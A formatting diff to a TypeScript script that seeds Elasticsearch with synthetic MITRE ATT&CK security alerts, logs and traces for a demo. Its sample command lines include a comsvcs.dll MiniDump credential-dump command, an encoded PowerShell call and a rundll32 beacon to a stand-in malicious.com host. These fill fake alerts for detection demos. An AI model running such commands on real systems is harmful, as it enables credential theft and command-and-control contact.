@@ -147,7 +147,7 @@ async function waitForKibanaAlerting(esClient: Client, maxWaitMs = 60000): Promi
     }
 
     // Wait 2 seconds before checking again
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    await new Promise((resolve) => setTimeout(resolve, 2000));
   }
 
   console.log('⚠️  Timeout waiting for Kibana alerting (continuing anyway)\n');
@@ -192,7 +192,12 @@ export async function generateAESOPDemoData(includeSampleConversations = true) {
     console.log('\n✅ AESOP Demo Data Generation Complete!\n');
     console.log('📊 Summary:');
     console.log(`  - Security alerts: ~${await countDocs(esClient, '.internal.alerts-*')}`);
-    console.log(`  - Agent Builder conversations: ~${await countDocs(esClient, '.agent-builder-conversations-*')}`);
+    console.log(
+      `  - Agent Builder conversations: ~${await countDocs(
+        esClient,
+        '.agent-builder-conversations-*'
+      )}`
+    );
     console.log(`  - APM traces: ~${await countDocs(esClient, '.ds-traces-apm*')}`);
     console.log(`  - Logs: ~${await countDocs(esClient, '.ds-logs-*')}`);
     console.log(`  - Metrics: ~${await countDocs(esClient, '.ds-metrics-*')}`);
@@ -229,14 +234,13 @@ async function loadEpisodeData(esClient: Client) {
     const firstDoc = JSON.parse(lines[0]);
     const isAlert = file.includes('alerts');
     // Use write alias for alerts (managed by Kibana), direct index for logs
-    const index = isAlert ? '.alerts-security.alerts-default' : 'logs-endpoint.events.process-default';
+    const index = isAlert
+      ? '.alerts-security.alerts-default'
+      : 'logs-endpoint.events.process-default';
 
     // Bulk index (use 'create' for data streams, 'index' for alerts via alias)
     const operation = isAlert ? 'index' : 'create';
-    const body = lines.flatMap((line) => [
-      { [operation]: { _index: index } },
-      JSON.parse(line),
-    ]);
+    const body = lines.flatMap((line) => [{ [operation]: { _index: index } }, JSON.parse(line)]);
 
     if (body.length > 0) {
       await esClient.bulk({ body, refresh: false });
@@ -283,14 +287,26 @@ function generateMITREAlert(tactic: any, technique: string, index: number): any 
   const timestamp = new Date(now.getTime() - Math.random() * 30 * 24 * 60 * 60 * 1000); // Last 30 days
 
   // Severity distribution: Critical (5%), High (15%), Medium (30%), Low (50%)
-  const severities = ['critical', 'high', 'high', 'medium', 'medium', 'medium', 'low', 'low', 'low', 'low'];
+  const severities = [
+    'critical',
+    'high',
+    'high',
+    'medium',
+    'medium',
+    'medium',
+    'low',
+    'low',
+    'low',
+    'low',
+  ];
   const severity = severities[Math.floor(Math.random() * severities.length)];
 
   return {
     '@timestamp': timestamp.toISOString(),
     'kibana.alert.rule.name': `${tactic.name} - ${technique}`,
     'kibana.alert.severity': severity,
-    'kibana.alert.risk_score': severity === 'critical' ? 90 : severity === 'high' ? 75 : severity === 'medium' ? 50 : 25,
+    'kibana.alert.risk_score':
+      severity === 'critical' ? 90 : severity === 'high' ? 75 : severity === 'medium' ? 50 : 25,
     'kibana.alert.workflow_status': 'open',
     'event.kind': 'signal',
     'event.category': ['malware', 'intrusion_detection'],
@@ -304,19 +320,21 @@ function generateMITREAlert(tactic: any, technique: string, index: number): any 
     'process.name': getProcessForTechnique(technique),
     'process.command_line': getCommandLineForTechnique(technique),
     'file.hash.sha256': generateRandomHash(),
-    'source.ip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
-    '_id': `${technique}-${index}-${uuidv4()}`,
+    'source.ip': `${Math.floor(Math.random() * 255)}.${Math.floor(
+      Math.random() * 255
+    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+    _id: `${technique}-${index}-${uuidv4()}`,
   };
 }
 
 function getTechniqueName(techniqueId: string): string {
   const names: Record<string, string> = {
-    'T1059': 'Command and Scripting Interpreter',
-    'T1003': 'OS Credential Dumping',
-    'T1071': 'Application Layer Protocol (C2)',
-    'T1190': 'Exploit Public-Facing Application',
-    'T1566': 'Phishing',
-    'T1053': 'Scheduled Task/Job',
+    T1059: 'Command and Scripting Interpreter',
+    T1003: 'OS Credential Dumping',
+    T1071: 'Application Layer Protocol (C2)',
+    T1190: 'Exploit Public-Facing Application',
+    T1566: 'Phishing',
+    T1053: 'Scheduled Task/Job',
     // ... add more as needed
   };
   return names[techniqueId] || 'Unknown Technique';
@@ -324,10 +342,10 @@ function getTechniqueName(techniqueId: string): string {
 
 function getProcessForTechnique(techniqueId: string): string {
   const processes: Record<string, string> = {
-    'T1059': 'powershell.exe',
-    'T1003': 'lsass.exe',
-    'T1071': 'rundll32.exe',
-    'T1190': 'nginx',
+    T1059: 'powershell.exe',
+    T1003: 'lsass.exe',
+    T1071: 'rundll32.exe',
+    T1190: 'nginx',
     // ... add more
   };
   return processes[techniqueId] || 'unknown.exe';
@@ -335,18 +353,16 @@ function getProcessForTechnique(techniqueId: string): string {
 
 function getCommandLineForTechnique(techniqueId: string): string {
   const commands: Record<string, string> = {
-    'T1059': 'powershell.exe -enc JABhAD0AJwBoAGUAbABsAG8AJw==',
-    'T1003': 'rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump',
-    'T1071': 'rundll32.exe http://malicious.com/beacon',
+    T1059: 'powershell.exe -enc JABhAD0AJwBoAGUAbABsAG8AJw==',
+    T1003: 'rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump',
+    T1071: 'rundll32.exe http://malicious.com/beacon',
     // ... add more
   };
   return commands[techniqueId] || '';
 }
 
 function generateRandomHash(): string {
-  return Array.from({ length: 64 }, () =>
-    Math.floor(Math.random() * 16).toString(16)
-  ).join('');
+  return Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -586,10 +602,7 @@ async function generateLogs(esClient: Client) {
   // Bulk index (using 'create' for data streams)
   for (let i = 0; i < logs.length; i += 1000) {
     const batch = logs.slice(i, i + 1000);
-    const body = batch.flatMap((log) => [
-      { create: { _index: 'logs-generic-default' } },
-      log,
-    ]);
+    const body = batch.flatMap((log) => [{ create: { _index: 'logs-generic-default' } }, log]);
     const result = await esClient.bulk({ body, refresh: false });
     if (result.errors) {
       console.error('  ⚠️  Bulk indexing had errors for logs');
